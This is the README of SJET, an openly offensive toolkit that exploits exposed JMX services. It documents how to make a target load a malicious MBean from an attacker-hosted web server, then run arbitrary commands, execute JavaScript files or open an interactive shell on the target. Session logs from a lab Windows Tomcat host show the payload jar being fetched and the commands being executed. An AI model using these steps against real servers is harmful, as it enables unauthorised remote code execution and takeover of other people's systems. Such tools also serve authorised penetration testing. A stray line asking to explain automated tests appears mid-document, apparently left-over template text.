# SJET by siberas

A JMX exploitation toolkit.

## Prerequisites


* [Jython](http://www.jython.org/)

## Usage

SJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):

```
jython sjet.py targetHost targetPort MODE (modeOptions)
```
Where

* **targetHost** -  the target IP address
* **targerPort** - the target port where JMX is running
* **MODE** - the script mode
* **modeOptions** - the options for the mode selected

### Modes and modeOptions

* **install** - installs the payload in the current target.
	* *payload_url* - full URL to load the payload
	* *payload_port* - port to load the payload
* **command** -  runs the command *CMD* in the targetHost
	* *CMD* - the command to run
* **javascript** - runs a javascript file *FILENAME* in the targetHost
	* *FILENAME* - the javascript to be run
* **shell** - starts a simple shell in targetHost (with the limitations of java's Runtime.exec())

Explain how to run the automated tests for this system

## Example


###Installing the payload in a Windows target:

```
Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 install http://192.168.56.1 8888
[+] sjet was brought to you by siberas :)
[+] Starting webserver at port 8888
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.56.101:8008/jmxrmi
[+] Connected: rmi://192.168.56.1  1
[+] Loaded javax.management.loading.MLet
[+] Loading malicious MBean from http://192.168.56.1:8888
[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
192.168.56.101 - - [11/Aug/2017 11:16:10] "GET / HTTP/1.1" 200 -
192.168.56.101 - - [11/Aug/2017 11:16:10] "GET /siberas_mlet.jar HTTP/1.1" 200 -
[+] Successfully loaded Siberas:name=payload,id=1
Patricios-MacBook-Pro:sjet preller$
```

###Running the command 'dir' in a Windows target:

```
Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 command "dir"
[+] sjet was brought to you by siberas :)
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.56.101:8008/jmxrmi
[+] Connected: rmi://192.168.56.1  2
[+] Loaded de.siberas.lab.SiberasPayload
[+] Executing command: dir
 Volume in drive C has no label.
 Volume Serial Number is E0CE-337D

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0

08/11/2017  01:34 AM    <DIR>          .
08/11/2017  01:34 AM    <DIR>          ..
08/11/2017  01:34 AM                 3 ASDASD.txt
08/10/2017  07:08 AM    <DIR>          bin
08/10/2017  07:08 AM    <DIR>          conf
08/10/2017  07:08 AM    <DIR>          lib
08/02/2017  01:29 PM            58,153 LICENSE
08/11/2017  01:24 AM    <DIR>          logs
08/02/2017  01:29 PM             1,859 NOTICE
08/02/2017  01:29 PM             6,881 RELEASE-NOTES
08/11/2017  02:16 AM    <DIR>          temp
08/02/2017  01:29 PM            21,630 tomcat.ico
08/02/2017  01:29 PM            73,690 Uninstall.exe
08/10/2017  07:08 AM    <DIR>          webapps
08/10/2017  07:08 AM    <DIR>          work
08/11/2017  02:30 AM                17 _____SURELY_A_SAFE_FILE_____.exe
08/11/2017  02:29 AM                17 _____AND_DONT_CALL_ME_SHIRLEY_____.exe
               8 File(s)        162,253 bytes
               9 Dir(s)  124,198,735,872 bytes free

[+] Done
Patricios-MacBook-Pro:sjet preller$
```

###Running the file poc.js in a Windows target:

```
Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 javascript "poc.js"
[+] sjet was brought to you by siberas :)
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.56.101:8008/jmxrmi
[+] Connected: rmi://192.168.56.1  4
[+] Loaded de.siberas.lab.SiberasPayload
[+] Executing script
None

Patricios-MacBook-Pro:sjet preller$
```
###Running ping in shell mode in a Windows target:

```
Patricios-MacBook-Pro:sjet preller$ Jython sjet.py 192.168.56.101 8008 shell
[+] sjet was brought to you by siberas :)
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.56.101:8008/jmxrmi
[+] Connected: rmi://192.168.56.1  9
[+] Use command 'exit_shell' to exit the shell
>>> ping 127.0.0.1
[+] Loaded de.siberas.lab.SiberasPayload
[+] Executing command: ping 127.0.0.1

Pinging 127.0.0.1 with 32 bytes of data:
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms


>>>
>>>
[4]+  Stopped                 Jython sjet.py 192.168.56.101 8008 shell
Patricios-MacBook-Pro:sjet preller$
```

## Contributing

Feel free to contribute.

## Authors

* **Hans-Martin Münch** - *Initial idea and work* - [h0ng10](https://github.com/h0ng10)
* **Patricio Reller** - *CLI and extra options* - [preller](https://github.com/preller)

See also the list of [contributors](https://github.com/h0ng10/sjet/graphs/contributors) who participated in this project.

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
